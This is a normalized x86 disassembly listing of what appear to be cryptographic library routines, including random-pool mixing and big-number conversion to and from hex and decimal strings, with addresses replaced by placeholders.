call sub_1001f5b0
add esp 0x10
mov ecx [ esp + 0x4c ]
mov eax [ esp + 0x14 ]
sub ecx 0x14
dec eax
mov [ esp + 0x4c ] ecx
mov [ esp + 0x14 ] eax
jne r-xdata
mov cl [ esp + eax + 0x30 ]
mov dl [ ebp + rw-data ]
xor dl cl
mov [ ebp + rw-data ] dl
inc ebp
cmp ebp 0x3ff
jl r-xdata
push esi
lea edx [ esp + 0x24 ]
push ebx
push edx
call sub_1002ab80
lea eax [ esp + 0x24 ]
push 0x8
lea ecx [ esp + 0x30 ]
push eax
push ecx
call sub_1002ab80
lea edx [ esp + 0x48 ]
push 0x0
lea eax [ esp + 0x3c ]
push edx
push eax
call sub_1002aba0
mov edi [ esp + 0x40 ]
add esp 0x24
inc edi
add ebx esi
xor eax eax
mov [ esp + 0x1c ] edi
test esi esi
jle r-xdata
mov ecx [ esp + 0x4c ]
mov edi [ esp + 0x10 ]
inc eax
cmp eax esi
jl r-xdata
xor ebp ebp
sub_10034b10
mov eax 0x34
call sub_1001d0d0
push ebx
push esi
mov esi [ esp + 0x44 ]
xor ebx ebx
test esi esi
jg r-xdata
push ebp
lea eax [ esp + 0x1c ]
push edi
push eax
call sub_1002aa30
lea ecx [ esi - 0x1 ]
mov eax 0x66666667
imul ecx
sar edx 0x2
mov ecx edx
push 0x17f
shr ecx 0x1f
push r--data
push 0x12
lea eax [ edx + ecx + 0x1 ]
push 0x9
lea ebp [ eax + eax * 4 ]
shl ebp 0x1
call sub_1001f5b0
push 0x182
push r--data
push 0x13
push 0x9
call sub_1001f5b0
call sub_1001f590
push 0x184
push r--data
push 0x13
push 0xa
mov [ rw-data ] eax
call sub_1001f5b0
mov eax [ rw-data ]
add esp 0x34
mov edi 0x1
test eax eax
mov [ rw-data ] edi
jne r-xdata
pop esi
mov eax 0x1
pop ebx
add esp 0x34
retn
mov eax [ rw-data ]
test eax eax
jne r-xdata
call sub_10051ac0
mov [ rw-data ] edi
fld [ rw-data ]
fcomp [ r--data ]
fnstsw ax
test ah 0x1
jne r-xdata
mov ebx edi
fild [ esp + 0x4c ]
mov [ esp + 0x10 ] 0x0
fsubr [ rw-data ]
fst [ rw-data ]
fcomp [ r--data ]
fnstsw ax
test ah 0x1
je r-xdata
mov [ esp + 0x10 ] edi
jmp r-xdata
test ebx ebx
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ esp + 0x18 ] ecx
mov ecx [ rw-data ]
mov ebx eax
mov [ esp + 0x1c ] ecx
add eax ebp
mov ecx 0x5
mov esi rw-data
lea edi [ esp + 0x30 ]
cmp eax edx
mov [ esp + 0x14 ] edx
mov [ rw-data ] eax
[ edi ] [ esi ]
jle r-xdata
mov esi 0x34
mov ebp [ rw-data ]
push 0x1ce
push r--data
inc ebp
push 0x12
push 0xa
mov [ rw-data ] ebp
mov [ rw-data ] 0x0
call sub_1001f5b0
add esp 0x10
cdq
idiv [ rw-data ]
mov [ rw-data ] edx
push 0x0
push 0x0
push 0x14
push r--data
call sub_10034800
add esp 0x10
dec esi
jne r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
sub eax edi
push 0x0
mov [ esp + 0x50 ] eax
call sub_100254d0
lea edx [ esp + 0x24 ]
push eax
push edx
call sub_1002aa50
lea eax [ esp + 0x3c ]
push 0x14
lea ecx [ esp + 0x30 ]
push eax
push ecx
call sub_1002ab80
lea edx [ esp + 0x30 ]
push 0x8
lea eax [ esp + 0x3c ]
push edx
push eax
call sub_1002ab80
mov ecx [ esp + 0x6c ]
push edi
lea edx [ esp + 0x48 ]
push ecx
push edx
call sub_1002ab80
mov ebp [ esp + 0x44 ]
mov esi ebx
sub esi ebp
add esp 0x30
add esi 0xa
test esi esi
jle r-xdata
mov edi eax
mov [ rw-data ] edi
lea ecx [ ebx + rw-data ]
push 0xa
lea edx [ esp + 0x24 ]
push ecx
push edx
call sub_1002ab80
add esp 0xc
mov eax 0xa
lea ecx [ ebx + rw-data ]
sub eax esi
lea edx [ esp + 0x20 ]
push eax
push ecx
push edx
call sub_1002ab80
push esi
lea eax [ esp + 0x30 ]
push rw-data
push eax
call sub_1002ab80
add esp 0x18
jmp r-xdata
cmp eax edi
jge r-xdata
xor ebx ebx
lea eax [ esp + 0x30 ]
push 0x0
lea ecx [ esp + 0x24 ]
push eax
push ecx
call sub_1002aba0
add esp 0xc
xor eax eax
inc eax
cmp eax 0xa
jl r-xdata
mov esi [ esp + 0x48 ]
mov cl [ esp + eax + 0x3a ]
mov [ esi ] cl
inc esi
mov [ esp + 0x48 ] esi
mov dl [ esp + eax + 0x30 ]
mov cl [ ebx + rw-data ]
xor cl dl
mov [ ebx + rw-data ] cl
inc ebx
cmp ebx ebp
jl r-xdata
mov eax [ esp + 0x4c ]
test eax eax
jg r-xdata
mov eax [ esp + 0x4c ]
mov edi 0xa
cmp eax 0xa
jge r-xdata
push 0x0
call sub_100254d0
lea edx [ esp + 0x24 ]
push eax
push edx
call sub_1002aa50
lea eax [ esp + 0x24 ]
push 0x8
lea ecx [ esp + 0x30 ]
push eax
push ecx
call sub_1002ab80
lea edx [ esp + 0x48 ]
push 0x14
lea eax [ esp + 0x3c ]
push edx
push eax
call sub_1002ab80
push 0x1f9
push r--data
push 0x12
push 0x9
call sub_1001f5b0
push 0x14
lea ecx [ esp + 0x58 ]
push rw-data
push ecx
call sub_1002ab80
add esp 0x40
lea edx [ esp + 0x20 ]
push 0x0
push rw-data
push edx
call sub_1002aba0
push 0x1fc
push r--data
push 0x12
push 0xa
call sub_1001f5b0
lea eax [ esp + 0x3c ]
push eax
call sub_1002b000
mov eax [ esp + 0x30 ]
add esp 0x20
test eax eax
pop edi
pop ebp
je r-xdata
push 0x203
push r--data
push 0x64
push 0x64
push 0x24
call sub_1001de60
push r--data
push 0x1
call sub_1001e1a0
add esp 0x1c
xor eax eax
pop esi
pop ebx
add esp 0x34
retn
pop esi
mov eax 0x1
pop ebx
add esp 0x34
retn
sub_10034ea0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push esi
push eax
push ecx
call sub_10021900
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
mov eax esi
pop esi
retn
call sub_1001e000
mov edx eax
and edx 0xff000000
cmp edx 0x24000000
jne r-xdata
and eax 0xfff
cmp eax 0x64
jne r-xdata
call sub_1001df60
sub_10034ef0
mov eax [ rw-data ]
push esi
test eax eax
push edi
mov esi 0x1
je r-xdata
xor edi edi
jmp r-xdata
push 0x225
push r--data
push 0x13
push 0x5
call sub_1001f5b0
call sub_1001f590
mov edx [ rw-data ]
xor ecx ecx
cmp edx eax
push 0x227
push r--data
push 0x13
sete cl
push 0x6
mov edi ecx
call sub_1001f5b0
add esp 0x20
test edi edi
jne r-xdata
push 0x22e
push r--data
push 0x12
push 0x9
call sub_1001f5b0
push 0x231
push r--data
push 0x13
push 0x9
call sub_1001f5b0
call sub_1001f590
push 0x233
push r--data
push 0x13
push 0xa
mov [ rw-data ] eax
call sub_1001f5b0
add esp 0x30
mov [ rw-data ] esi
mov eax [ rw-data ]
test eax eax
jne r-xdata
fld [ rw-data ]
fcomp [ r--data ]
fnstsw ax
test ah 0x1
je r-xdata
call sub_10051ac0
mov [ rw-data ] esi
test edi edi
jne r-xdata
xor esi esi
mov eax esi
pop edi
pop esi
retn
push 0x244
push r--data
push 0x12
push 0xa
mov [ rw-data ] edi
call sub_1001f5b0
add esp 0x10
sub_10035030
mov eax [ esp + 0x8 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov eax 0x1
retn
mov eax [ eax + 0x14 ]
test eax eax
je r-xdata
cmp [ esp + 0x4 ] 0x5
jne r-xdata
push sub_100350c0
push eax
call sub_1001e2c0
add esp 0x8
sub_100350e0
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
push 0x70
push r--data
push 0x43
push 0x6c
push 0x26
call sub_1001de60
add esp 0x14
xor eax eax
pop esi
retn
mov eax [ esi + 0x50 ]
dec eax
mov [ esi + 0x50 ] eax
push 0x74
push r--data
push 0x1e
lea eax [ esi + 0x50 ]
push 0xffffffff
push eax
call sub_1001f5f0
add esp 0x14
jmp r-xdata
mov eax 0x1
pop esi
retn
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
test eax eax
jg r-xdata
lea ecx [ esi + 0x58 ]
push ecx
push esi
push 0x9
call sub_1001f490
push esi
call sub_1001d740
add esp 0x10
push esi
call eax
add esp 0x4
sub_10035170
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call sub_10052180
add esp 0x4
push esi
call sub_1001d740
add esp 0x4
push sub_10052180
push eax
call sub_1001e730
add esp 0x8
sub_100351b0
mov eax 0x18
call sub_1001d0d0
push ebp
push esi
mov esi [ esp + 0x24 ]
xor ebp ebp
cmp [ esi + 0x40 ] ebp
jne r-xdata
mov eax [ esi + 0x40 ]
pop esi
pop ebp
add esp 0x18
retn
push ebx
push edi
push 0xfc
push r--data
push 0x3
push 0x9
call sub_1001f5b0
push 0x89
push r--data
push 0x18
mov [ esp + 0x3c ] ebp
call sub_1001d4c0
mov ebx eax
add esp 0x1c
cmp ebx ebp
je r-xdata
push 0xfe
push r--data
push 0x3
push 0xa
call sub_1001f5b0
mov eax [ esi + 0x40 ]
add esp 0x10
pop edi
pop ebx
pop esi
pop ebp
add esp 0x18
retn
lea eax [ esp + 0x10 ]
push ebp
or edi 0xffffffff
push eax
push 0x191
mov [ ebx ] ebp
mov [ ebx + 0x4 ] ebp
mov [ ebx + 0x8 ] ebp
mov [ ebx + 0xc ] edi
mov [ ebx + 0x10 ] edi
mov [ ebx + 0x14 ] edi
push esi
mov [ esi + 0x40 ] ebx
call sub_100367d0
mov ebp eax
add esp 0x10
test ebp ebp
mov [ esp + 0x18 ] ebp
jne r-xdata
mov eax [ ebp ]
test eax eax
jne r-xdata
cmp [ esp + 0x10 ] edi
jne r-xdata
cmp [ eax + 0x4 ] 0x102
je r-xdata
mov ecx [ ebp + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x28 ]
or ah 0x8
mov [ esi + 0x28 ] eax
jmp r-xdata
push eax
call sub_1002f4d0
add esp 0x4
mov [ ebx + 0x10 ] eax
test eax eax
je r-xdata
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
push ebp
call sub_100522a0
add esp 0x4
lea ecx [ esp + 0x10 ]
push 0x0
push ecx
push 0x59
push esi
call sub_100367d0
mov edi eax
add esp 0x10
test edi edi
jne r-xdata
cmp [ eax + 0x4 ] 0x102
je r-xdata
mov eax [ ebp + 0x4 ]
test eax eax
je r-xdata
push eax
call sub_1002eed0
add esp 0x4
mov edx [ esp + 0x10 ]
mov ebp [ esi + 0x40 ]
push edi
mov [ esp + 0x28 ] edx
mov [ esp + 0x18 ] 0x0
call sub_1001e7b0
add esp 0x4
test eax eax
je r-xdata
cmp [ esp + 0x10 ] 0xffffffff
jne r-xdata
push eax
call sub_1002f4d0
add esp 0x4
mov [ ebx + 0x14 ] eax
push sub_10052740
push edi
call sub_1001e730
mov edi [ esp + 0x1c ]
add esp 0x8
test edi edi
jg r-xdata
push sub_10035520
call sub_1001e440
add esp 0x4
mov [ ebp + 0x4 ] eax
test eax eax
je r-xdata
jmp r-xdata
test edi edi
mov [ esp + 0x10 ] edi
jle r-xdata
mov edx [ ebp + 0x4 ]
push sub_10052180
push edx
call sub_1001e730
add esp 0x8
mov [ ebp + 0x4 ] 0x0
push edi
mov [ esp + 0x20 ] 0x0
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
lea eax [ esp + 0x10 ]
push 0x0
push eax
push 0x2eb
push esi
call sub_100367d0
add esp 0x10
test eax eax
jne r-xdata
mov [ esp + 0x14 ] 0x1
jmp r-xdata
mov eax [ esp + 0x1c ]
push eax
push edi
call sub_1001e7c0
mov ecx [ esp + 0x2c ]
push ecx
push 0x0
push eax
call sub_100521d0
mov esi eax
add esp 0x14
test esi esi
je r-xdata
push eax
push esi
call sub_100524b0
add esp 0x8
mov [ esp + 0x10 ] eax
test eax eax
jle r-xdata
cmp [ esp + 0x10 ] 0xffffffff
jne r-xdata
mov esi [ esp + 0x2c ]
mov edx [ esi + 0x4 ]
push edx
call sub_10022ae0
add esp 0x4
cmp eax 0x2ea
jne r-xdata
mov ebp [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
push 0x0
push ecx
push 0x2ec
push esi
call sub_100367d0
add esp 0x10
mov [ esp + 0x20 ] eax
test eax eax
jne r-xdata
jmp r-xdata
mov eax [ ebp + 0x4 ]
push esi
push eax
call sub_1001e620
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x102
je r-xdata
cmp [ esp + 0x10 ] 0xffffffff
jne r-xdata
mov eax [ esp + 0x2c ]
mov [ esp + 0x14 ] 0xffffffff
mov ecx [ eax + 0x28 ]
or ch 0x8
mov [ eax + 0x28 ] ecx
mov ecx [ ebp + 0x4 ]
push esi
push ecx
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
mov [ ebp ] esi
jmp r-xdata
mov edx [ esp + 0x20 ]
push edx
call sub_1002f4d0
mov ebp [ esp + 0x1c ]
add esp 0x4
mov [ ebx + 0xc ] eax
jmp r-xdata
mov ebp [ esp + 0x18 ]
jmp r-xdata
push esi
call sub_10052180
add esp 0x4
test esi esi
je r-xdata
mov esi [ esp + 0x1c ]
push edi
inc esi
mov [ esp + 0x20 ] esi
call sub_1001e7b0
add esp 0x4
cmp esi eax
jl r-xdata
test ebp ebp
je r-xdata
mov esi [ esp + 0x2c ]
sub_100354d0
mov eax 0x10
call sub_1001d0d0
mov eax [ esp + 0x18 ]
push esi
mov esi [ esp + 0x18 ]
lea ecx [ esp + 0x4 ]
push ecx
mov [ esp + 0xc ] eax
mov edx [ esi + 0x4 ]
push edx
call sub_1001e620
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
push eax
mov eax [ esi + 0x4 ]
push eax
call sub_1001e7c0
add esp 0x8
pop esi
add esp 0x10
retn
xor eax eax
pop esi
add esp 0x10
retn
sub_100355c0
mov eax 0xc
call sub_1001d0d0
xor eax eax
push ebx
push ebp
mov [ esp + 0x10 ] eax
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x18 ]
push esi
push edi
push eax
call sub_10029870
lea esi [ eax + eax * 2 ]
mov eax 0x10624dd3
imul esi
mov ecx edx
mov eax 0x66666667
sar ecx 0x6
mov edx ecx
push 0x76
shr edx 0x1f
add ecx edx
imul esi
sar edx 0x2
mov eax edx
add edx ecx
shr eax 0x1f
push r--data
lea ebp [ eax + edx + 0x2 ]
mov eax 0x38e38e39
imul ebp
sar edx 0x1
mov ecx edx
shr ecx 0x1f
add edx ecx
lea edx [ edx * 4 + 0x4 ]
push edx
call sub_1001d4c0
mov edi eax
push 0x77
lea eax [ ebp + 0x3 ]
push r--data
push eax
mov [ esp + 0x30 ] edi
call sub_1001d4c0
mov ebx eax
add esp 0x1c
test ebx ebx
je r-xdata
push 0x7a
push r--data
push 0x41
push 0x68
push 0x3
call sub_1001de60
add esp 0x14
test edi edi
je r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push edi
call sub_1001d740
add esp 0x4
mov ecx [ esp + 0x20 ]
push ecx
call sub_10029b30
add esp 0x4
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
jne r-xdata
push eax
call sub_10029950
add esp 0x4
test edi edi
je r-xdata
mov ecx [ eax + 0x4 ]
mov esi ebx
test ecx ecx
jne r-xdata
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
add esp 0xc
retn
test ebx ebx
je r-xdata
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov [ ebx ] 0x30
mov [ ebx + 0x1 ] 0x0
mov [ esp + 0x18 ] 0x1
jmp r-xdata
push ebx
call sub_1001d740
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
mov eax [ edi - 0x4 ]
sub edi 0x4
mov ecx ebp
push eax
sub ecx esi
push r--data
lea edx [ ecx + ebx + 0x3 ]
push edx
push esi
call sub_100279b0
mov al [ esi ]
add esp 0x10
test al al
je r-xdata
jmp r-xdata
cmp edi [ esp + 0x14 ]
je r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
push 0x3b9aca00
push eax
call sub_10035a60
mov edx [ esp + 0x18 ]
mov [ edi ] eax
add esp 0x8
add edi 0x4
mov eax [ edx + 0x4 ]
test eax eax
jne r-xdata
mov edi [ esp + 0x14 ]
mov [ esp + 0x18 ] 0x1
jmp r-xdata
mov eax [ edi - 0x4 ]
sub edi 0x4
mov ecx ebp
push eax
sub ecx esi
push r--data
lea edx [ ecx + ebx + 0x3 ]
push edx
push esi
call sub_100279b0
mov al [ esi ]
add esp 0x10
test al al
je r-xdata
mov eax [ esp + 0x10 ]
cmp edi [ esp + 0x14 ]
jne r-xdata
mov al [ esi + 0x1 ]
inc esi
test al al
jne r-xdata
sub_100357a0
mov eax 0x8
call sub_1001d0d0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x20 ]
xor ebp ebp
cmp edi ebp
mov [ esp + 0x10 ] ebp
je r-xdata
xor eax eax
mov al [ edi ]
test al al
je r-xdata
cmp al 0x2d
jne r-xdata
xor eax eax
xor esi esi
mov al [ edi ]
push eax
call isxdigit
add esp 0x4
test eax eax
je r-xdata
inc edi
mov [ esp + 0x10 ] 0x1
mov [ esp + 0x20 ] edi
mov edx [ esp + 0x10 ]
mov edi [ esp + 0x1c ]
cmp edi ebp
lea eax [ esi + edx ]
mov [ esp + 0x14 ] eax
je r-xdata
inc esi
xor ecx ecx
mov cl [ esi + edi ]
push ecx
call isxdigit
add esp 0x4
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov eax [ edi ]
cmp eax ebp
jne r-xdata
mov ebx eax
push ebp
push ebx
call sub_10029cf0
add esp 0x8
call sub_100299b0
mov ebx eax
cmp ebx ebp
jne r-xdata
push eax
push ebx
call sub_10029af0
add esp 0x8
mov eax ebx
jmp r-xdata
lea eax [ esi * 4 + 0x1f ]
mov ecx [ ebx + 0x8 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
cmp eax ecx
jg r-xdata
test esi esi
mov edi esi
jle r-xdata
cmp [ edi ] ebp
jne r-xdata
cmp eax ebp
jne r-xdata
test ebp ebp
mov [ ebx + 0x4 ] ebp
jle r-xdata
cmp edi 0x8
mov esi 0x8
jge r-xdata
push ebx
call sub_10029950
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x1c ]
pop edi
mov [ ebx + 0xc ] eax
mov eax [ esp + 0x10 ]
pop esi
mov [ ecx ] ebx
pop ebp
pop ebx
add esp 0x8
retn
mov ecx [ ebx ]
lea eax [ ecx + ebp * 4 - 0x4 ]
mov eax [ esp + 0x20 ]
mov ecx edi
sub ecx esi
xor edx edx
add ecx eax
mov esi edi
mov edx [ ebx + 0x4 ]
dec edx
mov ecx edx
mov [ ebx + 0x4 ] edx
test ecx ecx
jg r-xdata
cmp eax 0x61
jl r-xdata
cmp eax 0x39
jg r-xdata
mov edx [ eax ]
sub eax 0x4
test edx edx
jne r-xdata
cmp eax 0x41
jl r-xdata
cmp eax 0x66
jg r-xdata
add eax 0xffffffd0
jmp r-xdata
xor eax eax
cmp eax 0x46
jg r-xdata
add eax 0xffffffa9
jmp r-xdata
shl edx 0x4
or edx eax
dec esi
inc ecx
test esi esi
jg r-xdata
movsx eax [ ecx ]
cmp eax 0x30
jl r-xdata
mov eax [ ebx ]
sub edi 0x8
mov [ eax + ebp * 4 ] edx
inc ebp
test edi edi
jg r-xdata
add eax 0xffffffc9
jmp r-xdata
sub_10035920
push ebx
mov ebx [ esp + 0xc ]
push ebp
xor ebp ebp
push esi
push edi
test ebx ebx
je r-xdata
xor eax eax
mov al [ ebx ]
test al al
je r-xdata
cmp al 0x2d
jne r-xdata
xor eax eax
xor edi edi
mov al [ ebx ]
push eax
call isdigit
add esp 0x4
test eax eax
je r-xdata
mov ebp 0x1
inc ebx
mov ecx [ esp + 0x14 ]
lea eax [ edi + ebp ]
test ecx ecx
mov [ esp + 0x18 ] eax
je r-xdata
inc edi
xor ecx ecx
mov cl [ edi + ebx ]
push ecx
call isdigit
add esp 0x4
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov esi [ ecx ]
test esi esi
jne r-xdata
push 0x0
push esi
call sub_10029cf0
add esp 0x8
call sub_100299b0
mov esi eax
test esi esi
jne r-xdata
push eax
push esi
call sub_10029af0
add esp 0x8
mov eax esi
jmp r-xdata
lea eax [ edi * 4 + 0x1f ]
mov ecx [ esi + 0x8 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
cmp eax ecx
jg r-xdata
mov eax edi
mov ecx 0x9
cdq
idiv ecx
mov eax ecx
sub eax edx
cmp eax ecx
jne r-xdata
mov edx [ esp + 0x14 ]
cmp [ edx ] 0x0
jne r-xdata
test eax eax
jne r-xdata
mov cl [ ebx ]
xor edi edi
test cl cl
je r-xdata
xor eax eax
push esi
call sub_10029950
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
test eax eax
jle r-xdata
movsx ecx cl
inc ebx
lea edx [ edi + edi * 4 ]
inc eax
cmp eax 0x9
lea edi [ ecx + edx * 2 - 0x30 ]
jne r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x18 ]
pop edi
mov [ ecx ] esi
pop esi
pop ebp
pop ebx
retn
mov edx [ esi ]
test eax eax
lea ecx [ edx + eax * 4 - 0x4 ]
jle r-xdata
mov cl [ ebx ]
test cl cl
jne r-xdata
push 0x3b9aca00
push esi
call sub_10035cb0
push edi
push esi
call sub_10035b20
add esp 0x10
xor edi edi
xor eax eax
mov eax [ ecx ]
sub ecx 0x4
test eax eax
jne r-xdata
mov edx [ esi + 0x4 ]
dec edx
mov eax edx
mov [ esi + 0x4 ] edx
test eax eax
jg r-xdata
sub_10035a60
mov eax 0x4
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
test ebp ebp
mov [ esp + 0xc ] 0x0
jne r-xdata
mov ebx [ esp + 0x14 ]
mov eax [ ebx + 0x4 ]
test eax eax
jne r-xdata
pop esi
pop ebp
or eax 0xffffffff
pop ebx
pop ecx
retn
push ebp
call sub_10029820
mov esi 0x20
sub esi eax
push esi
mov ecx esi
push ebx
push ebx
mov [ esp + 0x28 ] esi
shl ebp cl
call sub_10035e90
add esp 0x10
test eax eax
jne r-xdata
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn
push edi
mov edi [ ebx + 0x4 ]
dec edi
js r-xdata
pop esi
pop ebp
or eax 0xffffffff
pop ebx
pop ecx
retn
mov eax [ ebx + 0x4 ]
pop edi
test eax eax
jle r-xdata
mov eax [ ebx ]
mov ecx [ esp + 0x10 ]
push ebp
mov esi [ eax + edi * 4 ]
push esi
push ecx
call sub_100536a0
mov edx eax
mov ecx [ ebx ]
imul edx ebp
add esp 0xc
sub esi edx
mov [ ecx + edi * 4 ] eax
dec edi
mov [ esp + 0x10 ] esi
jns r-xdata
mov eax [ esp + 0xc ]
mov ecx esi
pop esi
pop ebp
shr eax cl
pop ebx
pop ecx
retn
mov edx [ ebx ]
mov ecx [ edx + eax * 4 - 0x4 ]
test ecx ecx
jne r-xdata
mov esi [ esp + 0x1c ]
dec eax
mov [ ebx + 0x4 ] eax
sub_10035b20
push esi
push edi
mov edi [ esp + 0x10 ]
test edi edi
je r-xdata
mov eax 0x1
mov esi [ esp + 0xc ]
mov eax [ esi + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ esi + 0xc ]
test ecx ecx
je r-xdata
push edi
push esi
call sub_10029cf0
add esp 0x8
pop edi
pop esi
retn
mov edx [ esi ]
mov ecx [ edx + eax * 4 - 0x4 ]
inc ecx
jne r-xdata
push edi
push esi
mov [ esi + 0xc ] 0x0
call sub_10035be0
mov ecx [ esi + 0x4 ]
add esp 0x8
test ecx ecx
je r-xdata
xor ecx ecx
mov ecx [ esi + 0x8 ]
inc eax
cmp eax ecx
jg r-xdata
pop edi
pop esi
retn
mov edx [ esi + 0xc ]
xor ecx ecx
test edx edx
sete cl
mov [ esi + 0xc ] ecx
pop edi
pop esi
retn
mov edx [ esi ]
mov eax [ edx + ecx * 4 ]
add eax edi
mov eax edi
jmp r-xdata
push eax
push esi
call sub_10029af0
add esp 0x8
mov eax esi
jmp r-xdata
mov eax [ esi + 0x4 ]
cmp ecx eax
jl r-xdata
mov edi 0x1
inc ecx
jmp r-xdata
mov edx [ esi ]
cmp edi eax
mov [ edx + ecx * 4 ] eax
jbe r-xdata
pop edi
pop esi
retn
test eax eax
jne r-xdata
inc eax
mov [ esi + 0x4 ] eax
cmp ecx [ esi + 0x4 ]
jl r-xdata
sub_10035be0
mov eax [ esp + 0x8 ]
push esi
test eax eax
push edi
je r-xdata
pop edi
mov eax 0x1
pop esi
retn
mov esi [ esp + 0xc ]
mov ecx [ esi + 0x4 ]
test ecx ecx
jne r-xdata
mov edx [ esi + 0xc ]
test edx edx
je r-xdata
push eax
push esi
call sub_10029cf0
mov edi eax
add esp 0x8
test edi edi
je r-xdata
cmp ecx 0x1
jne r-xdata
push eax
push esi
mov [ esi + 0xc ] 0x0
call sub_10035b20
add esp 0x8
mov [ esi + 0xc ] 0x1
pop edi
pop esi
retn
mov eax edi
pop edi
pop esi
retn
push 0x1
push esi
call sub_1002a190
add esp 0x8
mov edx [ esi ]
xor ecx ecx
mov edi [ edx ]
cmp edi eax
jae r-xdata
mov ecx [ esi ]
mov edx [ ecx ]
cmp edx eax
jae r-xdata
mov edx [ esi ]
mov edi [ edx + ecx * 4 ]
lea edx [ edx + ecx * 4 ]
sub edi eax
mov [ edx ] edi
mov eax [ esi ]
cmp [ eax + ecx * 4 ] 0x0
jne r-xdata
sub edi eax
inc ecx
mov [ edx ] edi
mov edx [ esi ]
mov eax 0x1
mov edi [ edx + ecx * 4 ]
lea edx [ edx + ecx * 4 ]
cmp edi eax
jb r-xdata
sub eax edx
pop edi
mov [ ecx ] eax
mov [ esi + 0xc ] 0x1
mov eax 0x1
pop esi
retn
mov eax [ esi + 0x4 ]
dec eax
cmp ecx eax
jne r-xdata
mov [ esi + 0x4 ] eax
sub_10035cb0
push esi
mov esi [ esp + 0x8 ]
push edi
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
pop edi
mov eax 0x1
pop esi
retn
mov edx [ esp + 0x10 ]
test edx edx
jne r-xdata
mov eax [ esi ]
push edx
push ecx
push eax
push eax
call sub_10053470
mov edi eax
add esp 0x10
test edi edi
je r-xdata
push edx
push esi
call sub_10029cf0
add esp 0x8
mov eax 0x1
pop edi
pop esi
retn
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
inc eax
cmp eax ecx
jg r-xdata
push eax
push esi
call sub_10029af0
add esp 0x8
mov eax esi
jmp r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
mov [ ecx + eax * 4 ] edi
mov eax [ esi + 0x4 ]
inc eax
mov [ esi + 0x4 ] eax
pop edi
pop esi
retn
test eax eax
jne r-xdata
sub_10035d30
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x10 ]
cmp ebx esi
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ ebx + 0x8 ]
inc eax
cmp eax ecx
jg r-xdata
mov eax [ esi + 0xc ]
mov ecx [ ebx + 0x8 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x4 ]
inc eax
cmp eax ecx
jg r-xdata
push eax
push ebx
call sub_10029af0
add esp 0x8
mov eax ebx
jmp r-xdata
push eax
push ebx
call sub_10029af0
add esp 0x8
mov eax ebx
jmp r-xdata
mov ecx [ ebx ]
mov eax [ esi + 0x4 ]
xor edx edx
xor ebx ebx
push edi
mov edi [ esi ]
test eax eax
jle r-xdata
pop esi
pop ebx
retn
test eax eax
jne r-xdata
mov ecx [ esi + 0x4 ]
mov [ ebx + 0x4 ] ecx
pop esi
pop ebx
retn
test eax eax
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn
push ebp
mov eax [ edi ]
add edi 0x4
add ecx 0x4
lea ebp [ eax + eax ]
or ebp edx
shr eax 0x1f
mov [ ecx - 0x4 ] ebp
mov edx eax
mov eax [ esi + 0x4 ]
inc ebx
cmp ebx eax
jl r-xdata
test edx edx
pop ebp
je r-xdata
mov eax [ esp + 0x10 ]
mov [ ecx ] 0x1
inc [ eax + 0x4 ]
sub_10035de0
push ebx
mov ebx [ esp + 0xc ]
push esi
mov eax [ ebx + 0x4 ]
test eax eax
jne r-xdata
mov esi [ esp + 0xc ]
cmp ebx esi
je r-xdata
push eax
mov eax [ esp + 0x10 ]
push eax
call sub_10029cf0
add esp 0x8
mov eax 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push ebp
mov ebp [ esi ]
xor edx edx
push edi
mov edi [ ebx ]
dec eax
js r-xdata
